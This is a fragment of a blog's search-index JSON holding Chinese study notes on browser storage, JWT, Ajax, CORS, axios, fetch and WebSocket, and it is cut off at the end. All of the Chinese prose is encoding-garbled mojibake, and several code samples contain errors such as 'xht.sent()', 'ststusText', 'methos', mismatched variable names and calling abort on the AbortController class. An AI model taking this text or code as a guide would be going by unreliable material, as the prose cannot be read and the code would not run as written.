è½½æœºåˆ¶ï¼Œå¦‚æœå­˜å‚¨å†…å®¹å¤šçš„è¯ä¼šæ¶ˆè€—å†…å­˜ç©ºé—´ï¼Œä¼šå¯¼è‡´é¡µé¢å˜å¡      localStorageä¸èƒ½è¢«çˆ¬è™«æŠ“å–åˆ°      ä¸åŒç‚¹  localStorageå±äºæ°¸ä¹…æ€§å­˜å‚¨  sessionStorageå±äºå½“ä¼šè¯ç»“æŸçš„æ—¶å€™ï¼Œé”®å€¼å¯¹ä¼šè¢«æ¸…ç©ºStorage ä»£ç  span{     display:inline-block;     background-color: aqua;     margin-left: 5px;     width: 20px;     height: 20px;}&lt;input type=\"text\"&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;ul class=\"history\"&gt;&lt;/ul&gt;const text = document.querySelector('input[type=\"text\"]');const btn = document.querySelector('button');const history = document.querySelector('.history');if(localStorage.length &gt; 0){ // åŠ è½½å®Œæˆæ—¶ï¼ŒåŠ è½½local Sessionä¸­çš„å€¼    for( let i = 0; i&lt;localStorage.length; i++) {        // ç»™historyæ·»åŠ li        let key = localStorage.key(i);        let li = document.createElement('li');         let liText = document.createTextNode(localStorage.getItem(key)); //åˆ›å»ºä¸€ä¸ª èŠ‚ç‚¹å†…å®¹        li.appendChild(liText);        history.appendChild(li);        // ç»™liæ·»åŠ åˆ é™¤æŒ‰é’®        let close = document.createElement('span');        li.append(close);        close.addEventListener('click', () =&gt; {            localStorage.removeItem(key);            li.parentNode.removeChild(li); // liçš„çˆ¶èŠ‚ç‚¹ï¼Œåˆ é™¤è¿™ä¸ªli        })    }}btn.addEventListener('click', () =&gt;{    if( text.value){ // è¾“å…¥æ¡†å†…å®¹ä¸ä¸ºç©º        let key = new Date().valueOf(); // æ—¶é—´å¯¹è±¡ï¼Œnewçš„æ—¶é—´ç‚¹ï¼ŒvalueOf() å–å…¶åŸå§‹å€¼ï¼Œä½œä¸ºé”®å€¼ï¼ˆä¸é‡å¤ï¼‰        let value = text.value;        localStorage.setItem(key, value); // æ·»åŠ localstrorageçš„æ–¹å¼        text.value = ''; // åˆå§‹åŒ–è¾“å…¥æ¡†        // ç»™historyæ·»åŠ li        let li = document.createElement('li');        let liText = document.createTextNode(localStorage.getItem(key)); // æ·»åŠ èŠ‚ç‚¹å†…å®¹        li.appendChild(liText);        history.appendChild(li);        // ç»™liæ·»åŠ åˆ é™¤æŒ‰é’®        let close = document.createElement('span');        li.appendChild(close);        close.addEventListener('click', ()=&gt;{            localStorage.removeItem(key);            li.parentNode.removeChild(li);        })    }})å±æ€§å’Œæ“ä½œsetItem å­˜å‚¨æ•°æ®  ä»¥â€å¥å€¼å¯¹â€çš„æ–¹å¼å­˜æ”¾æ•°æ®  setItem('key', 'value');å¯ç®€å†™ä¸ºlocalStorage.['key']= 'value';æˆ–è€…localStorage.key='value';  å•åŒå¼•å·é…åˆä½¿ç”¨ï¼Œè¡¨ç¤ºè¯ä¸­æœ‰è¯getItem è¯»å–æŒ‡å®šæ•°æ®  è·å–æŒ‡å®šäº†é”®åç§°çš„æ•°æ®å€¼  getItem('name')å¯ç®€å†™ä¸ºlocalStorage.name(å·²çŸ¥å…·ä½“çš„é”®åç§°æ—¶æ–¹)  å˜é‡ä¸å¯ç®€å†™removeItem æ•°æ®éå†  Storage.removeItem('name')  å½»åº•åˆ é™¤ï¼ŒåŒ…æ‹¬æ•°æ®çš„é”®åç§°å’Œå¯¹åº”çš„å€¼  å¦‚æœæä¾›çš„é”®åç§°æ— æ³•åŒ¹é…åˆ°å·²å­˜å‚¨çš„æ•°æ®ä¿¡æ¯ï¼Œåˆ™æœ¬æ¬¡ä¸è¿›è¡Œåˆ é™¤æ“ä½œã€‚clear åˆ é™¤å’Œæ¸…ç©ºStorage.clear();è¯¥æ–¹æ³•ä¸å¸¦ä»»ä½•å‚æ•°ï¼Œç›´æ¥è°ƒç”¨clear()å¯ä»¥æ¸…ç©ºæ•´ä¸ªlocalStorageæˆ–sessionStorageå¯¹è±¡ä¸­çš„æ‰€æœ‰æ•°æ®JWTâ€‹\tJSON Web Tokenä½¿ç”¨åœºæ™¯â€‹\ttokenæ˜¯ç”ŸæˆäºæœåŠ¡å™¨ï¼Œä½†ä¿å­˜åœ¨æµè§ˆå™¨ä¸­ï¼Œç”±å®¢æˆ·ç«¯ä¸»å¯¼ä¸€åˆ‡ï¼ˆå¯ä»¥å­˜æ”¾åœ¨cookieã€sessionä¸­ï¼‰ç»„æˆJTW -- header.payload.signatur\t\tç®—æ³•.  æ•°æ®.   ç­¾å  headerï¼šå£°æ˜ç­¾åç®—æ³•  payloadï¼š å­˜æ”¾æœ‰æ•ˆä¿¡æ¯æ•°æ®  signatureï¼š ç­¾è¯ä¸‰è€…äº’ç›¸å…³è”ï¼Œä¿®æ”¹ä»»ä½•ä¸€ä¸ªï¼Œå°±ä¼šå‘é€é”™è¯¯ï¼Œå®‰å…¨æ€§è¾ƒé«˜"
  },
  
  {
    "title": "7.å‘é€ç½‘è·¯è¯·æ±‚",
    "url": "/posts/7.%E5%8F%91%E9%80%81%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82/",
    "categories": "è®¡ç®—æœºç½‘ç»œ, Ajax, è·¨åŸŸ, fetch, websocket",
    "tags": "computerNetwork",
    "date": "2022-06-20 00:00:00 +0800",
    





    
    "snippet": "å‘é€ç½‘è·¯è¯·æ±‚Ajax æ€æƒ³  Ajaxå…¨ç§°ä¸ºAsynchronous Javascript And XMLï¼Œå³å¼‚æ­¥JSå’ŒXML  é€šè¿‡Ajaxå¯ä»¥åœ¨æµè§ˆå™¨ä¸­å‘æœåŠ¡å™¨å‘é€å¼‚æ­¥è¯·æ±‚ï¼Œæœ€å¤§çš„ä¼˜åŠ¿ï¼šæ— åˆ·æ–°è·å–æ•°æ®  AJAXä¸æ˜¯æ–°çš„ç¼–ç¨‹è¯­è¨€ï¼Œè€Œæ˜¯ä¸€ç§å°†ç°æœ‰çš„æ ‡å‡†ç»„åˆåœ¨ä¸€èµ·ä½¿ç”¨çš„æ–°æ–¹å¼ä¼˜ç¼ºç‚¹:+1: ä¼˜ç‚¹  å¯ä»¥æ— åˆ·æ–°é¡µé¢ä¸æœåŠ¡ç«¯è¿›è¡Œé€šä¿¡  å…è®¸ä½ æ ¹æ®ç”¨æˆ·äº‹ä»¶æ¥æ›´æ–°éƒ¨åˆ†é¡µé¢å†…å®¹:-1: ç¼ºç‚¹  æ²¡æœ‰æµ...",
    "content": "å‘é€ç½‘è·¯è¯·æ±‚Ajax æ€æƒ³  Ajaxå…¨ç§°ä¸ºAsynchronous Javascript And XMLï¼Œå³å¼‚æ­¥JSå’ŒXML  é€šè¿‡Ajaxå¯ä»¥åœ¨æµè§ˆå™¨ä¸­å‘æœåŠ¡å™¨å‘é€å¼‚æ­¥è¯·æ±‚ï¼Œæœ€å¤§çš„ä¼˜åŠ¿ï¼šæ— åˆ·æ–°è·å–æ•°æ®  AJAXä¸æ˜¯æ–°çš„ç¼–ç¨‹è¯­è¨€ï¼Œè€Œæ˜¯ä¸€ç§å°†ç°æœ‰çš„æ ‡å‡†ç»„åˆåœ¨ä¸€èµ·ä½¿ç”¨çš„æ–°æ–¹å¼ä¼˜ç¼ºç‚¹:+1: ä¼˜ç‚¹  å¯ä»¥æ— åˆ·æ–°é¡µé¢ä¸æœåŠ¡ç«¯è¿›è¡Œé€šä¿¡  å…è®¸ä½ æ ¹æ®ç”¨æˆ·äº‹ä»¶æ¥æ›´æ–°éƒ¨åˆ†é¡µé¢å†…å®¹:-1: ç¼ºç‚¹  æ²¡æœ‰æµè§ˆå†å²ï¼Œä¸èƒ½å›é€€  å­˜åœ¨è·¨åŸŸé—®é¢˜ï¼ˆåŒæºï¼‰  SEOï¼ˆæœç´¢å¼•æ“ä¼˜åŒ–ï¼‰ä¸å‹å¥½ï¼ˆçˆ¬è™«è·å–ä¸åˆ°ä¿¡æ¯ï¼‰  å­˜åœ¨å®‰å…¨é—®é¢˜ï¼š          è¦æ±‚éªŒè¯è¯·æ±‚å‘é€è€…æ˜¯å¦å¯¹èµ„æºæœ‰è®¿é—®æƒé™ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š                  è¦æ±‚é€šè¿‡SSLè®¿é—®èƒ½å¤Ÿæ¯”Ajaxè®¿é—®çš„èµ„æº          æ¯ä¸ªè¯·æ±‚éƒ½å‘é€ä¸€ä¸ªæŒ‰çº¦å®šç®—æ³•å¤„ç†çš„ä»¤ç‰Œ                    ä»¥ä¸‹æ‰‹æ®µå¯¹é˜²æŠ¤CSRFæ”»å‡»æ— æ•ˆï¼š                  å¯¹è¯·æ±‚æ–¹å¼ POSTã€GET çš„è¦æ±‚          å¯¹æ¥æº URL éªŒè¯ ï¼ˆ URLå¯ä»¥ä¼ªé€  ï¼‰          åŸºäºcookie éªŒè¯                    XML  å®ç°Step1 â€” åˆ›å»º XMLHttpRequest å¯¹è±¡const xhr = new XMLHttpRequest();Step2 â€” è®¾ç½®å¯¹è±¡å¹¶å‘é€  GETè¯·æ±‚ â€” ã€æ•°æ®è·Ÿåœ¨urlåé¢?åˆ†éš”ã€‘ // ã€get è¯·æ±‚ã€‘  xhr.open(\"GET\",\"url?t=\", isAsync); xht.sent(); // å°†è¯·æ±‚å‘é€å‡ºå»  POSTè¯·æ±‚ â€” ã€æ•°æ®åœ¨sendä¸­å‘é€ã€‘ // ã€post è¯·æ±‚ã€‘ xhr.open(\"POST\",\"url\", isAsync); xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); //è®¾ç½®è¯·æ±‚å¤´ å±æ€§ï¼Œå€¼ xhr.send(\"fname=Henry&amp;lname=Ford\"); //åœ¨sendä¸­å‘é€æ•°æ®ï¼ŒæœåŠ¡ç«¯èƒ½å¤Ÿè¯†åˆ«çš„ä»»æ„æ•°æ®      æ˜¯å¦å¼‚æ­¥ï¼ˆç¬¬ä¸‰ä¸ªå‚æ•°ï¼‰                  Async=true                  åœ¨onreadystatechange äº‹ä»¶ä¸­ï¼Œå®šä¹‰å°±ç»ªçŠ¶æ€æ—¶æ‰§è¡Œçš„å‡½æ•°                            Async=false                  ä¼šç­‰åˆ°æœåŠ¡å™¨å“åº”å°±ç»ªæ‰ç»§ç»­æ‰§è¡Œã€‚ï¼ˆä¸å»ºè®®ï¼‰          å¦‚æœæœåŠ¡å™¨ç¹å¿™æˆ–ç¼“æ…¢ï¼Œåº”ç”¨ç¨‹åºä¼šæŒ‚èµ·æˆ–åœæ­¢          ä¸éœ€è¦ç¼–å†™onreadystatechange å‡½æ•°ï¼Œç›´æ¥å°†åç»­ä»£ç å†™åœ¨sendåé¢                            readyStare å­˜æœ‰ XMLHttpRequest çš„çŠ¶æ€è¯·æ±‚çŠ¶æ€                  0: è¯·æ±‚æœªåˆå§‹åŒ–          1: æœåŠ¡å™¨è¿æ¥å·²å»ºç«‹          2: è¯·æ±‚å·²æ¥æ”¶          3: è¯·æ±‚å¤„ç†ä¸­          4: è¯·æ±‚å·²å®Œæˆï¼Œä¸”å“åº”å·²å°±ç»ª                æ¯æ¬¡readyStateå˜åŒ–ï¼Œéƒ½ä¼šè§¦å‘onreadystatechangeï¼›        å½“å“åº”ç ä¸º2XX+readyStareæ—¶ï¼Œè¡¨ç¤ºå“åº”å·²ç»å°±ç»ª            xhr.onreadystatechange=function(){    if (xhr.readyState== 4 &amp;&amp; xhr.status&gt;=200 &amp;&amp; xhr.status &lt;300 )    {         xhr.status; // çŠ¶æ€ç         xhr.ststusText; // çŠ¶æ€å­—ç¬¦ä¸²        xhr.getAllResponseHeader(); // æ‰€æœ‰å“åº”å¤´        xhr.response; // å“åº”ä½“        document.getElementById(\"myDiv\").innerHTML=xmlhttp.responseText;    }}Step3 â€” æ¥å—å¯¹è±¡æ•°æ®// æœåŠ¡ç«¯const data = {name:'hello'};let str = JSON.stringify(data);response.send(str); // è½¬åŒ–è¿‡çš„JSONå­—ç¬¦ä¸²// å®¢æˆ·ç«¯ 1. æ‰‹åŠ¨æ•°æ®è½¬åŒ–let data = JSON.parse(xhr.response);console.log(data);// å®¢æˆ·ç«¯ 2.è‡ªåŠ¨è½¬åŒ–xhr.responseType = 'json'; // é…ç½®çš„æ—¶å€™ï¼Œè®¾ç½®å“åº”ç±»å‹result.innerHTML = xhr.response.name; // è‡ªåŠ¨è§£æåï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨è¯·æ±‚è¶…æ—¶  è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œä¸­æ–­è¯·æ±‚const xhr = new XMLHttpRequest();xhr.timeout = 2000; // å“åº”è¶…æ—¶æ—¶é—´  ms å•ä½xhr.ontimeout = function(){\t// è¶…æ—¶æ—¶ï¼Œè°ƒç”¨çš„å‡½æ•°}  æ‰‹åŠ¨å–æ¶ˆè¯·æ±‚const xhr = new XMLHttpRequest();xhr.abort();é˜²æ­¢å¤šæ¬¡å‘é€è¯·æ±‚â€‹\tå‡å°‘é‡å¤å‘é€çš„è¯·æ±‚ï¼Œå‡å°‘æœåŠ¡å™¨çš„å‹åŠ›let inSending = false;if(isSending) x.abort(); //è¯·æ±‚æ­£åœ¨å‘é€ï¼Œåˆ™å–æ¶ˆè¯¥è¯·æ±‚ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ï¼›é‡å¤çš„è¯·æ±‚å·²ç»å‘é€æˆåŠŸ,ä¸å…è®¸é‡å¤æ“ä½œconst xhr = new XMLHttpRequest(); isSending = true; //è¯·æ±‚æ­£åœ¨å¤„ç† å‘é€xhr.open(\"\",\"\",true);xhr.send();xhr.onreadystatechange = function(){\tif(xhr.readyState== 4 &amp;&amp; xhr.status&gt;=200 &amp;&amp; xhr.status &lt;300 ) isSending = true; //è¯·æ±‚å·²ç»å‘é€}è·¨åŸŸä»€ä¹ˆæ˜¯è·¨åŸŸï¼Ÿ åŒæºç­–ç•¥åŒæºç­–ç•¥ï¼ˆSame-Origin Policyï¼‰æœ€æ—©ç”± Netscape å…¬å¸æå‡ºï¼Œæ˜¯æµè§ˆå™¨çš„ä¸€ç§å®‰å…¨ç­–ç•¥ï¼Œé˜²æ­¢ä¸€äº›æ¶æ„è¡Œä¸ºã€‚è¿èƒŒåŒæºç­–ç•¥å°±æ˜¯è·¨åŸŸï¼šåŒæºï¼šåè®®ã€åŸŸåã€ç«¯å£å· å¿…é¡»å®Œå…¨ç›¸åŒCORSâ€‹\tCORS (Cross-Origin Resource Sharing)ï¼Œè·¨åŸŸèµ„æºå…±äº«ã€‚CORS æ˜¯å®˜æ–¹çš„è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼Œä½¿ç”¨è‡ªå®šä¹‰çš„HTTPå¤´éƒ¨å…è®¸æµè§ˆå™¨å’ŒæœåŠ¡å™¨äº’ç›¸äº†è§£ã€‚  ä¸éœ€è¦åœ¨å®¢æˆ·ç«¯åšä»»ä½•ç‰¹æ®Šçš„æ“ä½œï¼Œå®Œå…¨åœ¨æœåŠ¡å™¨ä¸­è¿›è¡Œå¤„ç†ï¼Œæ”¯æŒ get å’Œ post ç­‰è¯·æ±‚  è·¨åŸŸèµ„æºå…±äº«æ ‡å‡†æ–°å¢äº†ä¸€ç»„ HTTP é¦–éƒ¨å­—æ®µï¼ˆå“åº”å¤´ï¼‰ï¼Œå…è®¸æœåŠ¡å™¨å£°æ˜å“ªäº›æºç«™é€šè¿‡æµè§ˆå™¨æœ‰æƒé™è®¿é—®å“ªäº›èµ„æº          å¯¹äºç®€å•è¯·æ±‚ï¼ˆGETã€POSTï¼‰ï¼Œæ²¡æœ‰è‡ªå®šä¹‰è¯·æ±‚å¤´ï¼Œä¸”è¯·æ±‚ä½“æ˜¯text/plainç±»å‹ï¼Œä¼šåœ¨å‘é€æ˜¯åŠ ä¸Šé¢å¤–çš„å¤´éƒ¨Origin:'å‘é€è¯·æ±‚çš„æº'      /// æœåŠ¡ç«¯è®¾ç½®å“åº”å¤´app.all('/cors',(Request,response)=&gt;{    response.setHeader(\"Access-Control-Allow-Origin\",\"*\")    // * å¯ä»¥æ›¿æ¢æˆæœåŠ¡ç«¯è¯·æ±‚çš„ â€˜åè®®ã€åŸŸåã€ç«¯å£å·â€™})  å¦‚æœè¯·æ±‚æ²¡æœ‰å¤´éƒ¨ã€æˆ–å¤´éƒ¨æºä¸åŒ¹é…ï¼ŒæœåŠ¡å™¨å°†ä¸ä¼šå¤„ç†ã€å“åº”è¯·æ±‚  å¦‚æœæœåŠ¡å™¨å†³å®šå›åº”è¯·æ±‚ï¼Œåœ¨å“åº”ä¸­å‘é€Access-Control-Allow-Oring: 'ç›¸åŒçš„æº'æˆ–æ˜¯ '*'  æœ€å¥½è®¿é—®æœ¬åœ°èµ„æºæ—¶ä½¿ç”¨ç›¸å¯¹URLï¼›è®¿é—®è¿œç¨‹èµ„æºæ—¶ä½¿ç”¨ç»å¯¹URLé¢„æ£€è¯·æ±‚â€‹\tğŸŒŸ æœåŠ¡å™¨éªŒè¯æœºåˆ¶ï¼Œç¬¦åˆä»¥ä¸‹è¦æ±‚çš„è¯·æ±‚æ—¶ï¼Œä¼šå…ˆå‘æœåŠ¡å™¨å‘é€ â€œé¢„æ£€â€è¯·æ±‚ï¼Œæ¥ç¡®å®šæœåŠ¡å™¨æ˜¯å¦å…è®¸è¿™ç§ç±»å‹çš„è¯·æ±‚  å…è®¸ä½¿ç”¨è‡ªå®šä¹‰å¤´éƒ¨  é™¤GETã€POSTä¹‹å¤–çš„æ–¹æ³•  ä¸åŒè¯·æ±‚ä½“å†…å®¹ç±»å‹â€‹\tğŸŒŸ è¿™ä¸ªè¯·æ±‚ä½¿ç”¨ OPTIONSæ–¹å¼å‘é€ï¼Œå¹¶åŒ…æ‹¬ä»¥ä¸‹å¤´éƒ¨  Originï¼šä¸ç®€å•è¯·æ±‚ç›¸åŒ  Access-Control-Request-Methodï¼šè¯·æ±‚å¸Œæœ›ä½¿ç”¨çš„æ–¹æ³•  [Access-Control-Request-Headers]ï¼šè‡ªå®šä¹‰å¤´éƒ¨ç±»åˆ«ï¼ˆé€—å·åˆ†éš”ï¼‰â€‹\tğŸŒŸ æœåŠ¡å™¨åœ¨å“åº”å¤´éƒ¨è¿”å›è¿™äº›ä¿¡æ¯  Access-Control-Allow-Originï¼šä¸ç®€å•è¯·æ±‚ç›¸åŒ  Access-Control-Allow-Methodï¼šå…è®¸è¯·æ±‚çš„æ–¹æ³•ï¼ˆé€—å·åˆ†éš”ï¼‰  Access-Control-Allow-Headersï¼šå…è®¸çš„å¤´éƒ¨ï¼ˆé€—å·åˆ†éš”ï¼‰  Access-Control-Max-Ageï¼šç¼“å­˜é¢„æ£€è¯·æ±‚çš„ç§’æ•°ï¼›ï¼ˆç¬¬ä¸€æ¬¡è¯·æ±‚æ‰ä¼šå¤šå‘ç”Ÿä¸€æ¬¡HTTPè¯·æ±‚ï¼‰å‡­æ®è¯·æ±‚â€‹\té»˜è®¤æƒ…å†µä¸‹ï¼Œè·¨æºè¯·æ±‚ä¸æä¾›å‡­æ®ï¼ˆ cookie , HTTPè®¤è¯å’Œå®¢æˆ·ç«¯ SSL è¯ä¹¦ï¼‰ã€‚â€‹\tå°†withCredentials = trueï¼Œæµè§ˆå™¨è¡¨ç¤ºè¯·æ±‚ä¼šå‘é€å‡­æ®ã€æœåŠ¡å™¨åœ¨é¢„æ£€è¯·æ±‚å“åº”ä¸­å‘é€è¡¨ç¤ºè¿™ä¸ªæºå…è®¸å‘é€å‡­æ®è¯·æ±‚â€‹\tå¦‚æœæœåŠ¡å™¨å…è®¸å¸¦å‡­æ®çš„è¯·æ±‚ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨å“åº”ä¸­åŒ…å«å¦‚ä¸‹HTTPå¤´éƒ¨ï¼šAccess-Control-Allow-Credentials: trueâ€‹\tå¦‚æœå‘é€äº†å‡­æ®è¯·æ±‚è€ŒæœåŠ¡å™¨è¿”å›çš„å“åº”ä¸­æ²¡æœ‰è¿™ä¸ªå¤´éƒ¨ï¼Œåˆ™æµè§ˆå™¨ä¸ä¼šæŠŠå“åº”äº¤ç»™JavaScript (responseTextæ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œstatusæ˜¯0ï¼Œonerror()è¢«è°ƒç”¨)ã€‚å…¶ä»–è·¨åŸŸè§£å†³æ–¹æ¡ˆâ€‹\t&lt;img&gt;ã€&lt;script&gt; åŠ è½½æ•°æ®æ—¶ï¼Œä¸ä¼šå—åˆ°åŒæºç­–ç•¥çš„é™åˆ¶ã€‚â€‹\t&lt;img&gt;ç¼ºç‚¹æ˜¯åªèƒ½å‘é€è¯·æ±‚å’Œæ¨é€æ•°æ®ï¼Œæ— æ³•è·å–æœåŠ¡å™¨å“åº”å†…å®¹ã€‚â€‹\t&lt;script&gt; ç¼ºç‚¹æ˜¯æ— æ³•å¯¹æ¶æ„å“åº”è¿›è¡Œæ‹¦æˆªï¼Œä¸ç¡®å®šè¯·æ±‚æ˜¯å¦å¤±è´¥è€Œåšå‡ºä¸­æ–­è¯·æ±‚çš„åŠ¨ä½œAxios å­¦ä¹   åŠŸèƒ½å¼ºå¤§çš„ç½‘ç»œè¯·æ±‚åº“,ä½“ç§¯å°  axioså®˜ç½‘ä½¿ç”¨            [èµ·æ­¥      Axios ä¸­æ–‡æ–‡æ¡£      Axios ä¸­æ–‡ç½‘ (axios-http.cn)](https://www.axios-http.cn/docs/intro)      é¡µé¢å¼•å…¥\t&lt;script src=\"https://cdn.jsdelivr.net/npm/vue/dist/vue.js\"&gt;&lt;/script&gt;è¯­æ³•axios#get(url[, config])axios#post(url[, data[, config]])axios#delete(url[, config])axios#put(url[, data[, config]])axios#patch(url[, data[, config]])axios#options(url[, config])axios#request(config)axios#head(url[, config])getè¯·æ±‚axios.get(\"åœ°å€?key=value&amp;key2=value2\").then(function(response){},function(err){})axios.get('/axios-server?t=', {    // url å‚æ•°    params: {},    //è¯·æ±‚å¤´ä¿¡æ¯    Headers: {}}).then(value =&gt; {    console.log(vale); // è‡ªåŠ¨è½¬åŒ–ä¸ºå¯¹è±¡}).catch(err =&gt; {    console.log(err);})  get(url)è¯·æ±‚  get().then(è¯·æ±‚å®Œæˆæ—¶è§¦å‘(å“åº”å†…å®¹ï¼Œ``.catch`è¯·æ±‚å¤±è´¥æ—¶è§¦å‘(é”™è¯¯ä¿¡æ¯)  get(url?key=value&amp;key1=value1): key=valueä¸ºå‚æ•°, keyä¸ºæ–‡æ¡£æä¾›çš„ï¼Œvalueä¸ºå…·ä½“ä¼ è¾“çš„æ•°æ®postè¯·æ±‚axios.post(\"åœ°å€\",{key=value&amp;key=value}).then(function(response){},function(err){})axios.post('/axios-server', {    //ç¬¬äºŒä¸ªå‚æ•°æ˜¯ æ•°æ®}, {    //è¯·æ±‚å¤´ä¿¡æ¯    Headers: {}}).then(value =&gt; {    console.log(vale); // è‡ªåŠ¨è½¬åŒ–ä¸ºå¯¹è±¡}).catch(err =&gt; {    console.log(err);})  post(åœ°å€,å‚æ•°å¯¹è±¡): {key=value}ä¸ºå‚æ•°å¯¹è±¡AJAXè¯·æ±‚axios({    methos:'post',    url:'/axios-server',    params:{}, // url å‚æ•°    Headers:{},    data:{} // è¯·æ±‚ä½“ å‚æ•°}).then(value =&gt; {    console.log(vale); // è‡ªåŠ¨è½¬åŒ–ä¸ºå¯¹è±¡}).catch(err =&gt; {    console.log(err);})axioså›è°ƒå‡½æ•°æ•°æ®ï¼Œè§£å†³:methods:{\tgetJoke:function(){\t\t// console.log(this.joke); æ­¤æ—¶å¯ä»¥æ‹¿åˆ°thisçš„æ•°å€¼\t\tvar that = this;\t\taxios.get(\"https://autumnfish.cn/api/joke\")\t\t\t.then(function(response){\t\t\t\t// console.log(this.joke); // ç¬¬äºŒæ¬¡è°ƒç”¨æ—¶,joke=undefind\t\t\t\tconsole.log(response.data);\t\t\t\tthat.joke = response.data;\t\t\t},function(error){})\t\t\t}}  å›è°ƒå‡½æ•°ä¸­çš„thiså·²ç»æ”¹å˜,æ— æ³•è®¿é—®å˜é‡ä¸­çš„å€¼,ç”¨thatä¿æŒèµ·æ¥  å’Œæœ¬åœ°åº”ç”¨æœ€å¤§çš„åŒºåˆ«æ—¶æ”¹å˜äº†æ•°æ®çš„æ¥æºfetch å­¦ä¹ â€‹\tfetch APIæä¾›äº†ä¸€ä¸ª JavaScript æ¥å£ï¼Œç”¨äºè®¿é—®å’Œæ“çºµ HTTP ç®¡é“çš„ä¸€äº›å…·ä½“éƒ¨åˆ†ï¼Œä¾‹å¦‚è¯·æ±‚å’Œå“åº”ã€‚å®ƒè¿˜æä¾›äº†ä¸€ä¸ªå…¨å±€ fetch() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æä¾›äº†ä¸€ç§ç®€å•ï¼Œåˆç†çš„æ–¹å¼æ¥è·¨ç½‘ç»œå¼‚æ­¥è·å–èµ„æºã€‚è¿™ç§åŠŸèƒ½ä»¥å‰æ˜¯ä½¿ç”¨ XMLHttpRequest å®ç°çš„ã€‚Fetch æä¾›äº†ä¸€ä¸ªæ›´ç†æƒ³çš„æ›¿ä»£æ–¹æ¡ˆã€‚  es6æ ‡å‡†ï¼Œæµè§ˆå™¨æä¾›çš„API  è¿™æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œä¸éœ€è¦newï¼Œè¿”å›ä¸€ä¸ªpromiseå¯¹è±¡ï¼ˆå¿…é¡»æ˜¯å¼‚æ­¥ï¼‰  é»˜è®¤ä½¿ç”¨GETè¯·æ±‚ï¼Œå‘é€POSTè¯·æ±‚éœ€è¦ ç¬¬äºŒä¸ªå‚æ•°é…ç½®  åªå…³æ³¨å‘é€è¯·æ±‚å’Œæ¥æ”¶å“åº”ï¼Œè€Œä¸å…³æ³¨å“åº”æ—¶é—´ã€å“åº”å†…å®¹ï¼Œéœ€è¦æ‰‹åŠ¨é…ç½®ğŸ“€ å…³äºå“åº”å†…å®¹æœ‰æ•ˆæ€§çš„å¤„ç†//  â€”â€” åªè¦å­˜åœ¨å“åº”ï¼ŒpromiseçŠ¶æ€å°±æ˜¯æˆåŠŸvar fetch = fetch('http://example.com/movies.json',{    // é…ç½®ä¸€ä¸ª promise å¯¹è±¡    method:'post',    body:JSON.stringify({}),    headers:{        'content-type': 'application/json'    }}).then(response =&gt; {    if(response.ok){        response.json; // è¿™é‡Œåªè€ƒè™‘è¿”å›å€¼ä¸º jsonã€‚        // response.headers.get('content-type').includes('application/json') å’Œ includes('text/html') åˆ¤æ–­å“åº”ç±»å‹ç±»å‹    }else {        // throw new Error('å‡ºç°é”™è¯¯ï¼ç½‘è·¯è¯·æ±‚å¤±è´¥')        return Promise.reject(response.json)    }})) // responseå¯¹è±¡ï¼Œéœ€è¦jsonå¤„ç†åæ‰å¯ä»¥è®¿é—®.then(data =&gt; console.log(data)).catch(error =&gt; {});ğŸ“€ å…³äºå“åº”æ—¶é—´è¿‡æœŸè¯·æ±‚çš„å¤„ç†var oldFetchfn = fetch;window.fetch = function(input, opts){\tvar fetchPromise = oldFetchfn(input,opts); // è°ƒç”¨æ—§è¯·æ±‚\tvar timeoutPromise = new Promise(function(resolve, reject){\t\tsetTimeout(()=&gt;{\t\t\treject(new Error('fetch tiomeout')); \t\t}, opts.timeout)\t});\treturn Promise.race([fetchPromise, timeoutPromise]); // è¿”å›å…ˆæ”¹å˜çŠ¶æ€çš„Promise}â€‹\tä»ç„¶ä¼šå‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œåªæ˜¯æŠŠè¶…æ—¶çš„æœåŠ¡å™¨å“åº”ä¸¢å¼ƒæ‰ï¼›é€ æˆæµé‡æµªè´¹ã€‚è¶…æ—¶æ—¶é—´åŒ…æ‹¬è¯·æ±‚è¿æ¥ã€æœåŠ¡å™¨å¤„ç†ã€æœåŠ¡å™¨å“åº”çš„æ‰€æœ‰è¯·æ±‚æ—¶é—´ã€‚ğŸ“€ ä¸­æ–­è¯·æ±‚ AbortController / AbortSignallet abortController = new AbortController();fetch('wikipeda.zip',{    signal: abortController.signal // å»ºç«‹å…³è”})setTimeout(()=&gt; AbortController.abort(),10) // ä¸­æ–­æ‰€æœ‰çš„è¯·æ±‚// å½“ abort() è¢«è°ƒç”¨ï¼Œfetch() promise å°†ä¼šæŠ›å‡ºä¸€ä¸ª AbortError.Web Socketâ€‹\té€šè¿‡å»ºç«‹ä¸€ä¸ªé•¿æ—¶è¿æ¥å®ç°ä¸æœåŠ¡å™¨å…¨åŒå·¥ã€åŒå‘çš„é€šä¿¡ã€‚ Web Socket éœ€è¦æ”¯æŒè¯¥åè®®çš„ä¸“ç”¨æœåŠ¡å™¨ï¼Œä½¿ç”¨è‡ªå®šä¹‰åè®®ï¼Œå»ºç«‹ å®‰å…¨è¿æ¥ã€‚â€‹\tä¼˜ç‚¹ï¼šå®‰å…¨è¿æ¥ï¼›å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´å‘é€æ•°æ®éå¸¸å°çš„æ•°æ®åŒ…ï¼Œå‡å°‘å¸¦å®½å‹åŠ›å’Œå»¶è¿Ÿé—®é¢˜ã€‚â€‹\tç¼ºç‚¹ï¼šåè®®å®šä¹‰æ—¶é—´æ¯”å®šä¹‰ JavaScriptAPI æ—¶é—´é•¿â€‹â€‹\tnew WebSocket(\"ws:// ....\")ï¼Œå¿…é¡»ä¼ 